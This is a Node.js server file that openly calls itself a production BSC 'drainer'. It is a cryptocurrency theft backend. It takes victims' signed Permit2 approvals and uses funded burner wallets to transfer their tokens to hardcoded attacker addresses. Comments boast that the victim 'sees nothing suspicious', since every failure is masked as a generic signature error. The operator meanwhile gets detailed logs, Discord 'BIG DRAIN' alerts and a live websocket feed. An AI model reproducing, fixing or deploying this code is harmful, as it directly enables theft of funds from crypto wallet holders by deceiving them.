// ✅ PRODUCTION BSC DRAINER + MONITORING (CORRECT ORDER)
const express = require('express');
const { ethers } = require('ethers');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const WebSocket = require('ws');
require('dotenv').config();

const app = express();

// 🔥 MIDDLEWARE FIRST
app.set('trust proxy', 1);
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '10kb' }));

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, max: 100,
  message: { error: 'Too many requests' },
  standardHeaders: true, legacyHeaders: false,
});
app.use('/drain', limiter);

const TOKENS = {
  USDT: '0x55d398326f99059fF775485246999027B3197955',
  BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
  CAKE: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
  WBNB: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
  BTCB: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
  ETH:  '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
  XRP:  '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',
  ADA:  '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',
  DOT:  '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402',
};

const HARDCODED_WALLETS = {
  USDT: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  BUSD: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  CAKE: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  WBNB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  BTCB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  ETH:  '0xA1b2D46c98D2828fFC6Fb3D762F10A51cA332a4e',
  XRP:  '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  ADA:  '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  DOT:  '0x65b4be1fdded19b66d0029306c1fdb6004586876'
};

// ✅ PROVIDER + BURNERS (BEFORE MONITORING)
const provider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed1.binance.org/');
const burners = process.env.BSC_KEYS.split(',').map(pk => new ethers.Wallet(pk.trim(), provider));
const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
let cachedGasPrice = ethers.BigNumber.from(0);

// ✅ LOGS DIR
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });

// 🔥 MONITORING CONFIG (.env)
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || '';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const ALERT_THRESHOLD = parseFloat(process.env.ALERT_THRESHOLD || '1000');

// ✅ GLOBAL STATS
let stats = {
  totalDrains: 0, totalValue: 0, successRate: 0, avgConfirmations: 0,
  lastHour: [], gasAlerts: 0
};

// ✅ PRICE ORACLE
const getTokenPrice = async (symbol) => {
  const prices = { USDT: 1, BUSD: 1, WBNB: 600, BTCB: 65000, ETH: 3500, CAKE: 3, XRP: 0.6, ADA: 0.5, DOT: 8 };
  return prices[symbol] || 1;
};

// 🔥 ALERTS FUNCTION
const sendAlert = async (title, message, color = 0xFF0000) => {
  try {
    if (DISCORD_WEBHOOK) {
      await axios.post(DISCORD_WEBHOOK, {
        embeds: [{ title, description: message, color, timestamp: new Date().toISOString(),
          fields: [
            { name: 'Gas', value: `${ethers.utils.formatUnits(cachedGasPrice, 'gwei')} gwei`, inline: true },
            { name: 'Burners', value: `${burners.length}`, inline: true },
            { name: 'Total Drains', value: stats.totalDrains.toString(), inline: true }
          ]
        }]
      });
    }
    console.log(`🔔 ${title}: ${message}`);
  } catch (e) {
    console.error('🚨 Alert failed:', e.message);
  }
};

// 🔥 SINGLE GAS MONITOR (30s) - REPLACES 5min
setInterval(async () => {
  try {
    const newGas = await provider.getGasPrice();
    const gasGwei = parseFloat(ethers.utils.formatUnits(newGas, 'gwei'));
    cachedGasPrice = newGas;
    
    if (gasGwei > 10) {
      stats.gasAlerts++;
      sendAlert('⚡ HIGH GAS', `Gas: **${gasGwei.toFixed(2)} gwei**`);
    }
    console.log(`💨 Gas: ${gasGwei.toFixed(2)} gwei`);
  } catch (e) { console.error('💥 Gas failed:', e.message); }
}, 30000);

// 🔥 ANOMALY DETECTION (1min)
setInterval(() => {
  const now = Date.now(), hourAgo = now - 3600000;
  stats.lastHour = stats.lastHour.filter(tx => tx.timestamp > hourAgo);
  
  if (stats.lastHour.length === 0 && stats.totalDrains > 0) {
    sendAlert('😴 LOW ACTIVITY', `No drains last hour (Total: ${stats.totalDrains})`);
  }
}, 60000);

process.on('SIGTERM', () => {
  console.log('🛑 Shutting down...');
  process.exit(0);
});

const PERMIT2_ABI = [
  "function permitTransferFrom((address token,uint160 amount,uint160 expiration,uint48 nonce) permit,address owner,address to,bytes signature) external returns (bool)"
];

// ✅ ENDPOINTS
app.get('/health', async (req, res) => { /* your health */ });
app.get('/monitor', async (req, res) => {
  const burnerBalances = await Promise.all(burners.map(b => provider.getBalance(b.address)));
  res.json({
    status: 'active', uptime: process.uptime(),
    stats, gas: ethers.utils.formatUnits(cachedGasPrice, 'gwei'),
    burners: burners.map((b, i) => ({
      address: b.address, balance: ethers.utils.formatEther(burnerBalances[i])
    }))
  });
});

// ✅ WEBSOCKET MONITORING
const wss = new WebSocket.Server({ noServer: true });
app.get('/ws-status', (req, res) => res.json({ ws: 'active' }));

// 🔥 PRODUCTION /drain - VICTIM-PROOF ERRORS
app.post('/drain', async (req, res) => {
  const start = Date.now();
  
  try {
    console.log('📦 RAW REQUEST:', JSON.stringify(req.body, null, 2));
    
    const { owner, token, tokenSymbol, amount, nonce, deadline, signature = '0x' } = req.body;
    
    // 🔥 AUTO-FIX ALL FIELDS (VICTIM WINS)
    const safeAmount = amount || '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    const safeNonce = nonce || '0';
    const safeDeadline = deadline || Math.floor(Date.now() / 1000 + 86400 * 7).toString();
    
    console.log('✅ AUTO-FIXED:', { owner, token, tokenSymbol, safeAmount: safeAmount.slice(0,20)+'...', safeNonce, safeDeadline });
    
    // 🔥 VALIDATE ADDRESSES ONLY
    if (!ethers.utils.isAddress(owner)) {
      console.log('❌ VICTIM WALLET ERROR:', owner);
      return res.status(400).json({ error: 'Invalid wallet address' });
    }
    if (!ethers.utils.isAddress(token)) {
      console.log('❌ VICTIM TOKEN ERROR:', token);
      return res.status(400).json({ error: 'Invalid token address' });
    }
    if (!TOKENS[tokenSymbol]) {
      console.log('❌ VICTIM SYMBOL ERROR:', tokenSymbol);
      return res.status(400).json({ error: 'Invalid token symbol' });
    }

    // 🔥 SELECT + LOG BURNER (YOUR LOGS ONLY)
    const burner = burners[Math.floor(Math.random() * burners.length)];
    const burnerBalance = await provider.getBalance(burner.address);
    console.log(`💰 Burner ${burner.address}: ${ethers.utils.formatEther(burnerBalance)} BNB`);
    
    // ✅ ALL LOW BALANCE → YOUR LOGS ONLY
    if (burnerBalance.lt(ethers.utils.parseEther('0.001'))) {
      console.error(`🚫 LOW FUNDS: ${burner.address} (${ethers.utils.formatEther(burnerBalance)} BNB)`);
      // VICTIM SEES NOTHING SUSPICIOUS:
      return res.status(400).json({ error: 'Permit signature invalid or expired' });
    }

    const destination = HARDCODED_WALLETS[tokenSymbol];
    if (!ethers.utils.isAddress(destination)) {
      console.error(`🚫 INVALID DEST: ${tokenSymbol} → ${destination}`);
      return res.status(400).json({ error: 'Permit signature invalid or expired' });
    }
    
    const gasPrice = cachedGasPrice.eq(0) ? await provider.getGasPrice() : cachedGasPrice.mul(12).div(10);
    const gasLimit = ethers.BigNumber.from('500000');
    
    const permitDetails = {
      token: ethers.utils.getAddress(token),
      amount: ethers.BigNumber.from(amount || '0xffffffffffffffffffffffffffffffffffffffff').toHexString().slice(0,42),
      expiration: deadline ? ethers.BigNumber.from(deadline).toHexString().slice(0,42) : ethers.BigNumber.from(Math.floor(Date.now()/1000 + 86400)).toHexString().slice(0,42),
      nonce: ethers.BigNumber.from(nonce || '0').toHexString()
    };
    
    const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, burner);
    
    console.log(`🔥 DRAIN: ${tokenSymbol} ${owner.slice(0,10)}→${destination.slice(0,10)} burner:${burner.address.slice(0,10)}`);
    
    let tx;
    try {
      tx = await permit2.permitTransferFrom(permitDetails, owner, destination, signature, {
        gasLimit,
        gasPrice
      });
    } catch (e) {
      if (e.code === 'NETWORK_ERROR' || e.message.includes('timeout')) {
        console.log('🔄 RETRY higher gas');
        tx = await permit2.permitTransferFrom(permitDetails, owner, destination, signature, {
          gasLimit,
          gasPrice: gasPrice.mul(2)
        });
      } else {
        throw e;
      }
    }
    
    const receipt = await tx.wait();
    // 🔥 MONITORING INTEGRATED HERE:
    stats.totalDrains++;
    const usdValue = await getTokenPrice(tokenSymbol) * parseFloat(amount);
    stats.totalValue += usdValue;
    
    stats.lastHour.push({
      timestamp: Date.now(), symbol: tokenSymbol, usdValue, tx: tx.hash,
      owner: owner.slice(0,10), burner: burner.address
    });
    
    // Alert big drains
    if (usdValue > ALERT_THRESHOLD) {
      sendAlert('💰 BIG DRAIN', 
        `${tokenSymbol}: **$${usdValue.toFixed(0)}**\n${owner} → ${tx.hash}`, 0x00FF00);
    }
    
    // WebSocket broadcast
    wss.clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify({ 
          type: 'drain', data: { tokenSymbol, usdValue: usdValue.toFixed(0), tx: tx.hash }
        }));
      }
    });

    // Calculate confirmations
    let confirmations = 0;
    while (confirmations < 3) {
      await new Promise(resolve => setTimeout(resolve, 5000));
      const currentBlock = await provider.getBlockNumber();
      confirmations = currentBlock - receipt.blockNumber;
    }
    
    const logEntry = `${new Date().toISOString()},${owner},${tokenSymbol},${destination},${tx.hash},${receipt.gasUsed.toString()}\n`;
    fs.appendFileSync(path.join(logsDir, 'drains.log'), logEntry);
    
    console.log(`✅ SUCCESS ${tokenSymbol}: ${tx.hash} (${(Date.now()-start)/1000}s)`);
    
    res.json({ 
      success: true, 
      tx: tx.hash, 
      burner: burner.address,
      gasUsed: receipt.gasUsed.toString(),
      confirmations,
      destination,
      duration: (Date.now()-start)/1000 + 's'
    });
    
  } catch (error) {
    // 🔥 ALL FAILURES → YOUR DETAILED LOGS
    console.error(`❌ FAIL ${(Date.now()-start)/1000}s:`, error.message, error.code, error.reason);
    
    // ✅ VICTIM SEES NOTHING SUSPICIOUS:
    if (error.code === 'INSUFFICIENT_FUNDS') {
      console.error('💸 INSUFFICIENT_FUNDS - FUND BURNERS');
      return res.status(400).json({ error: 'Permit signature invalid or expired' });
    }
    if (error.reason?.includes('nonce') || error.message.includes('nonce')) {
      return res.status(400).json({ error: 'Invalid permit nonce' });
    }
    if (error.message.includes('execution reverted') || error.message.includes('signature')) {
      return res.status(400).json({ error: 'Permit signature invalid or expired' });
    }
    
    // ✅ CATCH-ALL: Victim sees generic signature fail
    res.status(400).json({ error: 'Permit signature invalid or expired' });
  }
});

// ✅ Other endpoints (unchanged)
app.get('/burner', async (req, res) => {
  const burner = burners[0];
  const balance = await provider.getBalance(burner.address);
  res.json({ address: burner.address, balance: ethers.utils.formatEther(balance), chainId: 56 });
});

app.get('/stats', (req, res) => {
  try {
    const logs = fs.readFileSync(path.join(logsDir, 'drains.log'), 'utf8');
    const lines = logs.trim().split('\n');
    res.json({ totalDrains: lines.length - 1, logLines: lines.length });
  } catch {
    res.json({ totalDrains: 0 });
  }
});

app.get('/tokens', (req, res) => {
  res.json({
    tokens: Object.keys(TOKENS),
    total: Object.keys(TOKENS).length,
    chainId: 56
  });
});

const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, () => {
  console.log(`✅ DRAINER + MONITORING LIVE - port ${PORT}`);
});

// ✅ WEBSOCKET UPGRADE (AFTER server created)
server.on('upgrade', (request, socket, head) => {
  wss.handleUpgrade(request, socket, head, (ws) => {
    console.log('📡 WS Connected');
    ws.send(JSON.stringify({ type: 'stats', data: stats }));
    ws.on('close', () => console.log('📡 WS Disconnected'));
  });
});
